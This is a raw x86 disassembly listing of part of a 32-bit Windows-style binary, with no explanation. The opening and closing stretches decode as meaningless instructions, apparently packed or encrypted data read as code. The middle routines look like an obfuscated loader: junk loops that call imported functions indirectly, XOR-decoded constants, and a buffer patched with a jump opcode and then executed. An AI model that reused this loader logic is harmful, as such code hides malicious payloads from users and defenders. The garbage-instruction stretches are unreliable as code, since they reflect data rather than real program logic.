  406efc:	mov    edi,gs
  406efe:	aas    
  406eff:	dec    esi
  406f00:	stos   DWORD PTR es:[edi],eax
  406f01:	pop    ds
  406f02:	pushf  
  406f03:	inc    edx
  406f04:	add    DWORD PTR [eax-0x15],edi
  406f07:	mov    bh,0xe2
  406f09:	dec    esp
  406f0a:	mov    cl,0xab
  406f0c:	lock mov esi,eax
  406f0f:	sbb    eax,0xd812d4e1
  406f14:	mov    edi,0xa2e1346e
  406f19:	xor    ch,BYTE PTR [ebp+0x7d]
  406f1c:	mov    ecx,0x2e5d3f16
  406f21:	jmp    0xd8f4:0x47807e47
  406f28:	dec    ebp
  406f29:	cli    
  406f2a:	fidivr DWORD PTR ds:0xd408f620
  406f30:	xchg   edi,eax
  406f31:	ds loope 0x406f2c
  406f34:	pop    ecx
  406f35:	sti    
  406f36:	popa   
  406f37:	inc    esp
  406f38:	xor    eax,0x39ae41d2
  406f3d:	rol    DWORD PTR [esi+edx*1],1
  406f40:	sbb    eax,0x6f6059d3
  406f45:	data16 mov bl,0xcb
  406f48:	push   eax
  406f49:	std    
  406f4a:	mov    ecx,0xeac98680
  406f4f:	add    al,0xfb
  406f51:	daa    
  406f52:	inc    ecx
  406f53:	jo     0x406f95
  406f55:	das    
  406f56:	adc    al,0x44
  406f58:	mov    BYTE PTR es:[esp+ebp*4-0x2cdae83],ah
  406f60:	pop    ss
  406f61:	xor    al,ah
  406f63:	mov    ch,0xea
  406f65:	sbb    DWORD PTR [ecx-0xc],ebx
  406f68:	cmc    
  406f69:	cs sbb eax,0xfe6e8bfc
  406f6f:	(bad)  
  406f70:	loope  0x406f52
  406f72:	sub    BYTE PTR [esp+edx*8-0x66],bl
  406f76:	mov    ds:0xe7d99482,al
  406f7b:	sbb    al,0x36
  406f7d:	sbb    dh,cl
  406f7f:	cmp    BYTE PTR [esi+0x76930fa2],dh
  406f85:	in     al,dx
  406f86:	mov    eax,ds:0xbd3798a0
  406f8b:	mov    ch,0xed
  406f8d:	cli    
  406f8e:	arpl   WORD PTR [eax],dx
  406f90:	fsubr  DWORD PTR [eax+0x7184086d]
  406f96:	icebp  
  406f97:	repz inc esp
  406f99:	jle    0x406f3b
  406f9b:	clc    
  406f9c:	aas    
  406f9d:	(bad)  
  406f9f:	leave  
  406fa0:	cmp    DWORD PTR [ebx-0x7f827821],ecx
  406fa6:	push   edx
  406fa7:	(bad)  
  406fa8:	arpl   WORD PTR [eax-0x3d],bx
  406fab:	mov    DWORD PTR [ebp-0x51085928],ebp
  406fb1:	nop
  406fb2:	add    BYTE PTR [esi+0x1b33f5b5],0x44
  406fb9:	push   0x5f6f7546
  406fbe:	jo     0x40702c
  406fc0:	das    
  406fc1:	cmp    cl,BYTE PTR [eax-0x442dae90]
  406fc7:	es mov ch,0xbc
  406fca:	retf   
  406fcb:	das    
  406fcc:	inc    cl
  406fce:	mov    ebx,0xb7af93a7
  406fd3:	sub    al,BYTE PTR [edi+0x4b1d3a8b]
  406fd9:	adc    BYTE PTR [edi+0x5b663706],0x8
  406fe0:	icebp  
  406fe1:	mov    edi,0x4a94c9ba
  406fe6:	das    
  406fe7:	lods   al,BYTE PTR ds:[esi]
  406fe8:	mov    edx,DWORD PTR [ebx+0x7a]
  406feb:	mov    eax,eax
  406fed:	out    0x12,al
  406fef:	pop    esp
  406ff0:	ins    DWORD PTR es:[edi],dx
  406ff1:	cld    
  406ff2:	or     eax,DWORD PTR [esi-0x6e]
  406ff5:	push   ebx
  406ff6:	sub    DWORD PTR [edx+0x477f8012],ebx
  406ffc:	fimul  WORD PTR [eax-0x5b]
  406fff:	dec    ebp
  407000:	adc    al,0x48
  407002:	shl    BYTE PTR [esp+ecx*1-0x5e],0x63
  407007:	mov    dh,0x70
  407009:	push   es
  40700a:	mov    edi,0x7b2e4c4c
  40700f:	jb     0x40708a
  407011:	cmp    DWORD PTR [ebx-0x62],eax
  407014:	stos   BYTE PTR es:[edi],al
  407015:	mov    esi,0x4168710b
  40701a:	sbb    ebp,DWORD PTR ds:0x900a4333
  407020:	in     eax,0xd3
  407022:	sub    al,0x61
  407024:	shl    BYTE PTR [esi-0x5],cl
  407027:	sbb    bh,BYTE PTR [edx]
  407029:	js     0x407069
  40702b:	fst    DWORD PTR [esi+0x6c]
  40702e:	and    eax,0x782448ef
  407033:	(bad)  [ecx-0x43]
  407036:	xlat   BYTE PTR ds:[ebx]
  407037:	mov    ch,0x6b
  407039:	nop
  40703a:	fisttp WORD PTR [esi-0x5c904309]
  407040:	push   edi
  407041:	adc    BYTE PTR [edx+0x4c],cl
  407044:	out    dx,eax
  407045:	adc    eax,0x3537ac8a
  40704a:	and    dl,BYTE PTR [esi-0x7a]
  40704d:	cmp    eax,0xd523813f
  407052:	js     0x40703c
  407054:	lahf   
  407055:	adc    BYTE PTR fs:[ebp+0x72],0x9b
  40705a:	cmp    eax,0xf04da14a
  40705f:	jbe    0xb50581cd
  407065:	mov    bl,0xe8
  407067:	xchg   edi,eax
  407068:	das    
  407069:	dec    ecx
  40706a:	sbb    BYTE PTR [edx],ch
  40706c:	mov    ebp,0x2ba4372b
  407071:	pushw  es
  407073:	jne    0x407006
  407075:	jp     0x4070d8
  407077:	push   ecx
  407078:	and    eax,0x2008da3f
  40707d:	cmp    ebp,edx
  40707f:	dec    edi
  407080:	add    al,0xd0
  407082:	add    dl,bl
  407084:	add    BYTE PTR [edi],al
  407086:	retf   
  407087:	addr16 hlt 
  407089:	mov    esp,0x404b765d
  40708e:	in     al,dx
  40708f:	add    dh,0x9c
  407092:	xor    eax,0x1e757b2
  407097:	je     0x4070ab
  407099:	fstp   st(1)
  40709b:	jecxz  0x4070ec
  40709d:	bound  edi,QWORD PTR [edi+0x6f]
  4070a0:	push   esi
  4070a1:	rcr    BYTE PTR [ecx],1
  4070a3:	mov    DWORD PTR [esi-0x51],esi
  4070a6:	out    dx,al
  4070a7:	mov    esp,0x1e26414
  4070ac:	jbe    0x407105
  4070ae:	je     0x40706e
  4070b0:	sbb    al,0xfd
  4070b2:	and    DWORD PTR ss:[ebx-0x422ff07b],eax
  4070b9:	or     DWORD PTR [esi-0xa],edx
  4070bc:	xchg   ebx,edi
  4070be:	mul    BYTE PTR [eax-0x77837b26]
  4070c4:	lock add DWORD PTR [edi+eax*8-0x2b],ebx
  4070c9:	packsswb mm7,QWORD PTR [edx-0x2b]
  4070cd:	pop    ebx
  4070ce:	xchg   ebp,eax
  4070cf:	mov    ebp,ebx
  4070d1:	ds dec esi
  4070d3:	sbb    BYTE PTR [ebp+0x618de737],bl
  4070d9:	fadd   QWORD PTR [edi]
  4070db:	xlat   BYTE PTR ds:[ebx]
  4070dc:	dec    esp
  4070dd:	xchg   DWORD PTR [ebp-0x41],edx
  4070e0:	in     eax,0x73
  4070e2:	xlat   BYTE PTR ds:[ebx]
  4070e3:	xor    al,0xfa
  4070e5:	jnp    0x4070b5
  4070e7:	cmp    al,0x62
  4070e9:	mov    DWORD PTR [esi],esp
  4070eb:	int3   
  4070ec:	push   ds
  4070ed:	aaa    
  4070ee:	sbb    BYTE PTR [ebx+0x53],al
  4070f1:	xor    dh,BYTE PTR [ebx]
  4070f3:	jbe    0x40713d
  4070f5:	rol    DWORD PTR [eax+0x33],1
  4070f8:	inc    edx
  4070f9:	push   ss
  4070fa:	mov    eax,ds:0xb59fed52
  4070ff:	sub    eax,0x9b6e4e68
  407104:	dec    edx
  407105:	adc    BYTE PTR [esi],ch
  407107:	std    
  407108:	mov    esi,0x839f81c2
  40710d:	lods   eax,DWORD PTR ds:[esi]
  40710e:	(bad)  [ebx]
  407110:	mov    dh,0x39
  407112:	out    0x84,al
  407114:	xchg   esi,eax
  407115:	lock pop edi
  407117:	int3   
  407118:	dec    esp
  407119:	inc    esi
  40711a:	mov    ah,0xbb
  40711c:	das    
  40711d:	xchg   cl,dh
  40711f:	out    dx,al
  407120:	jns    0x4070e3
  407122:	sub    al,0x4e
  407124:	mov    ecx,0x18d1efb8
  407129:	in     al,0x17
  40712b:	aas    
  40712c:	je     0x40715a
  40712e:	pop    ecx
  40712f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407130:	imul   ebp,DWORD PTR [edi+0x45],0x62972c9
  407137:	xchg   ebp,eax
  407138:	or     eax,0x1f52f9b8
  40713d:	in     al,dx
  40713e:	xor    DWORD PTR [edi],esi
  407140:	xchg   ecx,eax
  407141:	inc    edi
  407142:	test   al,0xcd
  407144:	call   0xe19f6856
  407149:	in     al,0xc0
  40714b:	(bad)  
  40714c:	lds    ecx,FWORD PTR [esi-0x33]
  40714f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407150:	mov    esi,0x918a0db7
  407155:	rcr    DWORD PTR [edx],cl
  407157:	pop    ebp
  407158:	int    0xd0
  40715a:	xchg   ecx,eax
  40715b:	loopne 0x4071ba
  40715d:	jecxz  0x407170
  40715f:	imul   ecx,ecx,0x90d40bea
  407165:	xlat   BYTE PTR ds:[ebx]
  407166:	mov    edi,0xf146de6f
  40716b:	fidivr WORD PTR [edx]
  40716d:	pop    ebx
  40716e:	inc    edi
  40716f:	fsub   QWORD PTR [eax]
  407171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407172:	movhlps xmm7,xmm4
  407175:	cmc    
  407176:	push   ds
  407177:	push   0xf06b65bc
  40717c:	xlat   BYTE PTR ds:[ebx]
  40717d:	and    BYTE PTR ds:0x5b94fdd3,bl
  407183:	es test eax,0xcd17ee91
  407189:	pushf  
  40718a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40718b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40718c:	rcr    bh,0xdf
  40718f:	pushf  
  407190:	cmp    eax,DWORD PTR [edx+edi*2]
  407193:	sub    BYTE PTR [eax],dl
  407195:	fmul   DWORD PTR ds:0xd37882bb
  40719b:	cmp    BYTE PTR [edi],bh
  40719d:	mov    DWORD PTR [ecx-0x7b],edx
  4071a0:	addr16 mov ecx,0x6ee2fb27
  4071a6:	dec    ebp
  4071a7:	pop    ss
  4071a8:	das    
  4071a9:	mov    al,ds:0xf24e7b3
  4071ae:	aam    0xc
  4071b0:	pop    ds
  4071b1:	or     DWORD PTR [esi-0x3b92f20c],eax
  4071b7:	ficomp DWORD PTR [esp+ebx*4]
  4071ba:	and    cl,BYTE PTR [eax+0x65]
  4071bd:	or     al,0x4d
  4071bf:	mov    eax,ds:0x56fea377
  4071c4:	mov    esp,0x78f8b08a
  4071c9:	push   edi
  4071ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071cb:	pop    ebx
  4071cd:	loop   0x407225
  4071cf:	inc    esi
  4071d0:	jmp    0x49e7:0x2a89f6f3
  4071d7:	fsub   DWORD PTR [eax-0x77]
  4071da:	mov    ecx,0x83879800
  4071df:	fld    QWORD PTR [edx]
  4071e1:	mov    dh,0x56
  4071e3:	inc    esi
  4071e4:	imul   DWORD PTR [ecx+eax*1+0x1a720767]
  4071eb:	pusha  
  4071ec:	aaa    
  4071ed:	add    ax,0xc687
  4071f1:	ss dec esp
  4071f3:	ds sub eax,0xe846ecfc
  4071f9:	or     eax,0xee488f7f
  4071fe:	sub    BYTE PTR [esi-0x30b6c77d],al
  407204:	int    0xf2
  407206:	mov    al,ds:0x3a2678dc
  40720b:	(bad)  
  40720c:	fist   DWORD PTR [eax]
  40720e:	(bad)  
  40720f:	aad    0xcc
  407211:	mov    dh,BYTE PTR [ebx]
  407213:	sar    DWORD PTR [edx+0x3272dd],0x3
  40721a:	ret    0x4589
  40721d:	or     BYTE PTR [ebx-0x3ecc13bb],cl
  407223:	add    eax,edx
  407225:	mov    edx,DWORD PTR [ebp+0x14]
  407228:	imul   eax,DWORD PTR [edx]
  40722b:	mov    edx,DWORD PTR [ebp-0x4]
  40722e:	xor    edx,ecx
  407230:	mov    ecx,DWORD PTR [ebp+0x8]
  407233:	lea    ecx,[edx+ecx*1+0x3272dd]
  40723a:	cmp    ecx,eax
  40723c:	je     0x4072b3
  407242:	mov    edi,DWORD PTR [ebp-0x14]
  407245:	mov    eax,DWORD PTR [ebp+0x8]
  407248:	mov    edx,DWORD PTR [ebp+0x14]
  40724b:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40724f:	mov    ecx,0x7510896
  407254:	xor    edx,edx
  407256:	xor    edi,ecx
  407258:	mov    esi,0x3272dd
  40725d:	add    edi,esi
  40725f:	div    edi
  407261:	mov    edx,DWORD PTR [ebp-0x4]
  407264:	xor    edx,ecx
  407266:	lea    eax,[edx+eax*1+0x3272dd]
  40726d:	mov    edx,DWORD PTR [ebp+0x8]
  407270:	mov    edi,DWORD PTR [ebp-0x20]
  407273:	mov    DWORD PTR [edi+edx*4],eax
  407276:	mov    eax,DWORD PTR [ebp-0x14]
  407279:	mov    edx,DWORD PTR [ebp+0x8]
  40727c:	xor    eax,ecx
  40727e:	lea    eax,[eax+edx*1+0x3272dd]
  407285:	mov    DWORD PTR [ebp+0x8],eax
  407288:	mov    eax,DWORD PTR [ebp-0x14]
  40728b:	mov    edx,DWORD PTR [ebp+0x14]
  40728e:	xor    eax,ecx
  407290:	add    eax,esi
  407292:	imul   eax,DWORD PTR [edx]
  407295:	mov    edx,DWORD PTR [ebp-0x4]
  407298:	xor    edx,ecx
  40729a:	mov    ecx,DWORD PTR [ebp+0x8]
  40729d:	lea    ecx,[edx+ecx*1+0x3272dd]
  4072a4:	cmp    ecx,eax
  4072a6:	jne    0x407242
  4072ac:	mov    eax,esi
  4072ae:	jmp    0x4072b8
  4072b3:	mov    eax,0x3272dd
  4072b8:	mov    ebx,0x7510896
  4072bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4072c0:	xor    ecx,ebx
  4072c2:	add    ecx,eax
  4072c4:	mov    DWORD PTR [ebp-0xc],ecx
  4072c7:	mov    ebx,0x65655
  4072cc:	add    ebx,0x3234
  4072d2:	xchg   ebx,esi
  4072d4:	xor    ebx,ebx
  4072d6:	push   esi
  4072d7:	mov    esi,ebx
  4072d9:	pop    ebx
  4072da:	mov    edx,esi
  4072dc:	add    ebx,0x1002
  4072e2:	lea    eax,[ebp-0x10]
  4072e5:	add    edx,eax
  4072e7:	add    edx,0x5
  4072ea:	push   edx
  4072eb:	inc    esi
  4072ec:	pop    ecx
  4072ed:	dec    ecx
  4072ee:	xchg   ecx,eax
  4072ef:	dec    eax
  4072f0:	xchg   ecx,eax
  4072f1:	dec    ecx
  4072f2:	xchg   ecx,edx
  4072f4:	dec    edx
  4072f5:	push   edx
  4072f6:	mov    edx,ebx
  4072f8:	pop    ebx
  4072f9:	dec    ebx
  4072fa:	call   DWORD PTR [ebx]
  4072fc:	cmp    DWORD PTR [ebp+0x10],esi
  4072ff:	je     0x40731e
  407305:	xchg   edx,eax
  407306:	push   0xb
  407308:	pop    ecx
  407309:	push   0x4
  40730b:	pop    ebx
  40730c:	inc    ebx
  40730d:	xchg   ebx,ecx
  40730f:	sub    ebx,ecx
  407311:	xchg   ebx,ecx
  407313:	dec    ecx
  407314:	dec    ecx
  407315:	mov    eax,DWORD PTR [ebp-0x1c]
  407318:	imul   eax,ecx
  40731b:	add    esp,eax
  40731d:	xchg   edx,eax
  40731e:	push   eax
  40731f:	xor    ebx,ebx
  407321:	mov    edx,esp
  407323:	dec    edx
  407324:	inc    ebx
  407325:	add    ebx,DWORD PTR [edx+ebx*1]
  407328:	dec    ebx
  407329:	xor    edx,edx
  40732b:	add    DWORD PTR [ebp-0xc],ebx
  40732e:	pop    ebx
  40732f:	mov    eax,DWORD PTR [ebp-0xc]
  407332:	pop    edi
  407333:	pop    esi
  407334:	pop    ebx
  407335:	leave  
  407336:	ret    0x10
  407339:	push   ebp
  40733a:	mov    ebp,esp
  40733c:	sub    esp,0x7c
  40733f:	and    DWORD PTR ds:0x420e92,0x0
  407349:	jmp    0x40735b
  40734e:	mov    ecx,DWORD PTR ds:0x420e92
  407354:	inc    ecx
  407355:	mov    DWORD PTR ds:0x420e92,ecx
  40735b:	cmp    DWORD PTR ds:0x420e92,0x15
  407362:	jae    0x4073cc
  407368:	cmp    DWORD PTR ds:0x420e92,0x1f
  40736f:	jne    0x407388
  407375:	push   0x3dd4
  40737a:	push   0x422018
  40737f:	push   DWORD PTR [ebp-0xc]
  407382:	call   DWORD PTR ds:0x4247e5
  407388:	jmp    0x40734e
  40738d:	mov    DWORD PTR ds:0x420f64,0x1c
  407397:	cmp    DWORD PTR ds:0x420f64,0x0
  40739e:	je     0x4073cc
  4073a4:	cmp    DWORD PTR ds:0x420f64,0x1d
  4073ab:	jne    0x4073b7
  4073b1:	call   DWORD PTR ds:0x4247f1
  4073b7:	mov    eax,ds:0x420f64
  4073bc:	dec    eax
  4073bd:	mov    ds:0x420f64,eax
  4073c2:	jmp    0x407397
  4073c7:	adc    eax,0x653
  4073cc:	push   esi
  4073cd:	and    DWORD PTR ds:0x42200c,0x0
  4073d7:	jmp    0x4073e9
  4073dc:	mov    esi,DWORD PTR ds:0x42200c
  4073e2:	inc    esi
  4073e3:	mov    DWORD PTR ds:0x42200c,esi
  4073e9:	cmp    DWORD PTR ds:0x42200c,0x16
  4073f0:	jae    0x40742e
  4073f6:	cmp    DWORD PTR ds:0x42200c,0xa
  4073fd:	jne    0x407409
  407403:	call   DWORD PTR ds:0x4247f5
  407409:	cmp    DWORD PTR ds:0x42200c,0x9
  407410:	jne    0x407423
  407416:	mov    esi,DWORD PTR ds:0x42200c
  40741c:	inc    esi
  40741d:	mov    DWORD PTR ds:0x42200c,esi
  407423:	jmp    0x4073dc
  407428:	sbb    DWORD PTR ds:0x420f00,edx
  40742e:	push   edi
  40742f:	mov    eax,ds:0x424435
  407434:	mov    DWORD PTR ds:0x420f70,0x12
  40743e:	cmp    DWORD PTR ds:0x420f70,0x0
  407445:	je     0x40748b
  40744b:	cmp    DWORD PTR ds:0x420f70,0x17
  407452:	jne    0x407479
  407458:	push   0x87b3
  40745d:	push   DWORD PTR [ebp-0x28]
  407460:	push   0x420f68
  407465:	push   0x7b70
  40746a:	push   DWORD PTR [ebp-0x18]
  40746d:	push   DWORD PTR [ebp-0x24]
  407470:	push   DWORD PTR [ebp-0x14]
  407473:	call   DWORD PTR ds:0x4247f9
  407479:	mov    edi,DWORD PTR ds:0x420f70
  40747f:	dec    edi
  407480:	mov    DWORD PTR ds:0x420f70,edi
  407486:	jmp    0x40743e
  40748b:	mov    DWORD PTR [ebp-0x24],eax
  40748e:	mov    eax,ds:0x424541
  407493:	xor    esi,edi
  407495:	mov    DWORD PTR [ebp-0x34],eax
  407498:	and    edi,DWORD PTR ds:0x420f5c
  40749e:	and    DWORD PTR [ebp-0x30],0x0
  4074a2:	and    eax,edi
  4074a4:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  4074ab:	adc    DWORD PTR ds:0x420ef0,edx
  4074b1:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  4074b8:	mov    edi,DWORD PTR ds:0x420ec2
  4074be:	mov    eax,ds:0x420f7c
  4074c3:	sub    edi,eax
  4074c5:	sub    edi,DWORD PTR [edi+eax*1]
  4074c8:	mov    eax,DWORD PTR [ebp-0x10]
  4074cb:	or     edi,0x1b5b
  4074d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4074d4:	and    DWORD PTR ds:0x420ea2,0x0
  4074de:	xor    esi,esi
  4074e0:	xor    esi,DWORD PTR ds:0x420ea2
  4074e6:	inc    esi
  4074e7:	mov    DWORD PTR ds:0x420ea2,esi
  4074ed:	cmp    DWORD PTR ds:0x420ea2,0x20
  4074f4:	jne    0x407508
  4074fa:	push   DWORD PTR [ebp-0x28]
  4074fd:	push   0x424093
  407502:	call   DWORD PTR ds:0x4247fd
  407508:	cmp    DWORD PTR ds:0x420ea2,0x19
  40750f:	jb     0x4074de
  407515:	sub    eax,ecx
  407517:	and    DWORD PTR ds:0x420fac,0x0
  407521:	xor    ecx,ecx
  407523:	or     ecx,DWORD PTR ds:0x420fac
  407529:	inc    ecx
  40752a:	mov    DWORD PTR ds:0x420fac,ecx
  407530:	cmp    DWORD PTR ds:0x420fac,0x5
  407537:	jne    0x407550
  40753d:	push   0x42414e
  407542:	push   0x0
  407544:	push   DWORD PTR [ebp-0x28]
  407547:	push   DWORD PTR [ebp-0x10]
  40754a:	call   DWORD PTR ds:0x424801
  407550:	cmp    DWORD PTR ds:0x420fac,0x4
  407557:	jne    0x40756a
  40755d:	mov    ecx,DWORD PTR ds:0x420fac
  407563:	inc    ecx
  407564:	mov    DWORD PTR ds:0x420fac,ecx
  40756a:	cmp    DWORD PTR ds:0x420fac,0x16
  407571:	jb     0x407521
  407577:	and    DWORD PTR ds:0x420f9c,0x0
  407581:	jmp    0x407593
  407586:	mov    ecx,DWORD PTR ds:0x420f9c
  40758c:	inc    ecx
  40758d:	mov    DWORD PTR ds:0x420f9c,ecx
  407593:	cmp    DWORD PTR ds:0x420f9c,0x11
  40759a:	jae    0x4075dc
  4075a0:	cmp    DWORD PTR ds:0x420f9c,0x5
  4075a7:	jne    0x4075bd
  4075ad:	push   0x420f74
  4075b2:	push   0x1cd6
  4075b7:	call   DWORD PTR ds:0x424805
  4075bd:	cmp    DWORD PTR ds:0x420f9c,0x4
  4075c4:	jne    0x4075d7
  4075ca:	mov    ecx,DWORD PTR ds:0x420f9c
  4075d0:	inc    ecx
  4075d1:	mov    DWORD PTR ds:0x420f9c,ecx
  4075d7:	jmp    0x407586
  4075dc:	mov    DWORD PTR [ebp-0x10],eax
  4075df:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  4075e6:	mov    eax,DWORD PTR [ebp-0x18]
  4075e9:	mov    ecx,DWORD PTR [ebp-0x18]
  4075ec:	sub    eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x18],eax
  4075f1:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4075f8:	mov    eax,DWORD PTR [ebp-0xc]
  4075fb:	mov    ecx,DWORD PTR [ebp-0xc]
  4075fe:	sub    eax,ecx
  407600:	mov    DWORD PTR [ebp-0xc],eax
  407603:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  40760a:	mov    eax,DWORD PTR [ebp-0x1c]
  40760d:	mov    ecx,DWORD PTR [ebp-0x1c]
  407610:	sub    eax,ecx
  407612:	mov    DWORD PTR [ebp-0x1c],eax
  407615:	or     DWORD PTR [ebp-0x1c],0xf89c85d5
  40761c:	mov    eax,DWORD PTR [ebp-0x20]
  40761f:	mov    ecx,DWORD PTR [ebp-0x20]
  407622:	sub    eax,ecx
  407624:	mov    DWORD PTR [ebp-0x20],eax
  407627:	mov    eax,DWORD PTR [ebp-0x2c]
  40762a:	mov    ecx,DWORD PTR [ebp-0x20]
  40762d:	mov    esi,0x7510896
  407632:	xor    eax,esi
  407634:	mov    edi,0x3272dd
  407639:	add    eax,edi
  40763b:	or     eax,ecx
  40763d:	mov    DWORD PTR [ebp-0x20],eax
  407640:	mov    eax,DWORD PTR [ebp-0x4]
  407643:	mov    ecx,DWORD PTR [ebp-0x4]
  407646:	sub    eax,ecx
  407648:	mov    DWORD PTR [ebp-0x4],eax
  40764b:	or     DWORD PTR [ebp-0x4],0xf89c85be
  407652:	mov    eax,DWORD PTR [ebp-0xc]
  407655:	xor    eax,esi
  407657:	add    eax,edi
  407659:	push   eax
  40765a:	mov    eax,DWORD PTR [ebp-0x10]
  40765d:	xor    eax,esi
  40765f:	add    eax,edi
  407661:	push   eax
  407662:	mov    eax,DWORD PTR [ebp-0x4]
  407665:	xor    eax,esi
  407667:	add    eax,edi
  407669:	push   eax
  40766a:	lea    eax,[ebp-0x7c]
  40766d:	push   eax
  40766e:	push   DWORD PTR [ebp-0x2c]
  407671:	push   DWORD PTR [ebp-0x28]
  407674:	call   0x410b90
  407679:	test   eax,eax
  40767b:	je     0x4076a9
  407681:	lea    eax,[ebp-0x7c]
  407684:	push   eax
  407685:	mov    eax,DWORD PTR [ebp-0x28]
  407688:	xor    eax,esi
  40768a:	add    eax,edi
  40768c:	push   eax
  40768d:	mov    eax,DWORD PTR [ebp-0x24]
  407690:	add    eax,0xaa
  407695:	push   eax
  407696:	mov    eax,DWORD PTR [ebp-0x24]
  407699:	mov    eax,DWORD PTR [eax+0x198]
  40769f:	push   DWORD PTR [eax]
  4076a1:	call   0x402470
  4076a6:	mov    DWORD PTR [ebp-0x14],eax
  4076a9:	lea    eax,[ebp+0x4]
  4076ac:	mov    DWORD PTR [ebp-0x30],eax
  4076af:	mov    eax,DWORD PTR [ebp-0x14]
  4076b2:	test   eax,eax
  4076b4:	je     0x40771c
  4076ba:	lea    eax,[ebp-0x8]
  4076bd:	mov    DWORD PTR [ebp-0x38],eax
  4076c0:	mov    eax,DWORD PTR [ebp-0x34]
  4076c3:	mov    DWORD PTR [ebp-0x8],eax
  4076c6:	mov    eax,DWORD PTR [ebp-0x8]
  4076c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4076cc:	sub    eax,ecx
  4076ce:	mov    DWORD PTR [ebp-0x8],eax
  4076d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4076d4:	xor    ecx,esi
  4076d6:	mov    eax,0xffcd8d23
  4076db:	sub    eax,ecx
  4076dd:	add    DWORD PTR [ebp-0x8],eax
  4076e0:	mov    eax,DWORD PTR [ebp-0x8]
  4076e3:	mov    ecx,DWORD PTR [ebp-0x14]
  4076e6:	mov    DWORD PTR [ecx+0x1],eax
  4076e9:	mov    eax,DWORD PTR [ebp-0x14]
  4076ec:	push   DWORD PTR [ebp-0x24]
  4076ef:	mov    BYTE PTR [eax],0xe9
  4076f2:	mov    eax,ds:0x4242b1
  4076f7:	push   DWORD PTR [eax]
  4076f9:	push   DWORD PTR ds:0x42450d
  4076ff:	push   DWORD PTR ds:0x4242b9
  407705:	push   DWORD PTR ds:0x4244ed
  40770b:	push   DWORD PTR ds:0x4245a5
  407711:	push   DWORD PTR [ebp-0x28]
  407714:	push   DWORD PTR [ebp-0x2c]
  407717:	mov    eax,DWORD PTR [ebp-0x14]
  40771a:	call   eax
  40771c:	mov    eax,DWORD PTR [ebp-0x30]
  40771f:	mov    ecx,DWORD PTR ds:0x4244b1
  407725:	add    DWORD PTR [eax],ecx
  407727:	pop    edi
  407728:	pop    esi
  407729:	leave  
  40772a:	ret    
  40772b:	push   ebp
  40772c:	mov    ebp,esp
  40772e:	sub    esp,0x18
  407731:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  407738:	lea    eax,[ebp+0x14]
  40773b:	mov    DWORD PTR [ebp-0x4],eax
  40773e:	jmp    0x409ab8
  407743:	das    
  407744:	or     DWORD PTR [eax+0x13b778ea],edx
  40774a:	mov    esp,DWORD PTR [esi-0x10]
  40774d:	in     eax,0x6d
  40774f:	jno    0x407792
  407751:	jle    0x4077a1
  407753:	call   0x7a5f:0x197a7a20
  40775a:	jp     0x40774c
  40775c:	pop    ebp
  40775d:	in     eax,0xe0
  40775f:	loope  0x407748
  407761:	mov    dl,0x6
  407763:	and    DWORD PTR [ebx],esi
  407765:	adc    al,0x5f
  407767:	mov    dh,BYTE PTR [eax]
  407769:	popa   
  40776a:	push   edi
  40776b:	cli    
  40776c:	and    eax,0xadc24a8e
  407771:	push   ds
  407772:	pop    ecx
  407773:	dec    ecx
  407774:	int3   
  407775:	mov    ds:0xf6b1aac3,al
  40777a:	loope  0x40777e
  40777c:	sub    DWORD PTR [ebx+0xfb9d0b1],ebp
  407782:	push   ebp
  407783:	dec    ecx
  407784:	adc    eax,0xcb6cd4bc
  407789:	fldl2t 
  40778b:	jbe    0x407759
  40778d:	jl     0x4077a1
  40778f:	sahf   
  407790:	(bad)  
  407792:	sbb    eax,0x6a32505c
  407797:	rcr    esp,cl
  407799:	inc    edi
  40779a:	leave  
  40779b:	stos   BYTE PTR es:[edi],al
  40779c:	jge    0x40772b
  40779e:	shl    DWORD PTR [eax-0x24],1
  4077a1:	xchg   edx,eax
  4077a2:	mov    WORD PTR [esi+0x40],cs
  4077a5:	fnstsw WORD PTR [esi+0x24]
  4077a8:	loopne 0x40778e
  4077aa:	int    0x86
  4077ac:	mov    ecx,0xe739ca06
  4077b1:	xlat   BYTE PTR ds:[ebx]
  4077b2:	imul   DWORD PTR [edi]
  4077b4:	jle    0x4077b4
  4077b6:	pop    ebp
  4077b7:	ins    DWORD PTR es:[edi],dx
  4077b8:	cmp    ebx,edi
  4077ba:	add    dl,al
  4077bc:	(bad)  
  4077bd:	sti    
  4077be:	mov    edi,0x8f2e39e8
  4077c3:	xchg   esi,eax
  4077c4:	ja     0x4077dc
  4077c6:	call   0xefd4:0x17b05357
  4077cd:	mov    ecx,0x66184a87
  4077d2:	mov    ds:0x72e630e8,eax
  4077d7:	or     ecx,DWORD PTR gs:[ecx+0x54678ac]
  4077de:	mov    edx,0xf54e1646
  4077e3:	and    cl,ch
  4077e5:	ret    
  4077e6:	xor    al,0x23
  4077e8:	mov    eax,ds:0x93c8d199
  4077ed:	cld    
  4077ee:	arpl   WORD PTR [bp+di-0x1be9],sp
  4077f3:	addr16 mov esp,0xbd2a8e7f
  4077f9:	jg     0x4077e0
  4077fb:	hlt    
  4077fc:	test   eax,0x1e7b2324
  407801:	pop    eax
  407802:	cs loopne 0x40781d
  407805:	fiadd  DWORD PTR [edi+0x28]
  407808:	fwait
  407809:	xor    DWORD PTR [edx-0x128d58fd],edx
  40780f:	(bad)  
  407810:	scas   al,BYTE PTR es:[edi]
  407811:	outs   dx,DWORD PTR ds:[esi]
  407812:	jo     0x4077c5
  407814:	cmp    al,0x41
  407816:	sbb    ah,BYTE PTR [esi+0x56]
  407819:	mov    esi,edi
  40781b:	sar    DWORD PTR [edx-0x38298809],cl
  407821:	test   eax,0xd587cb7c
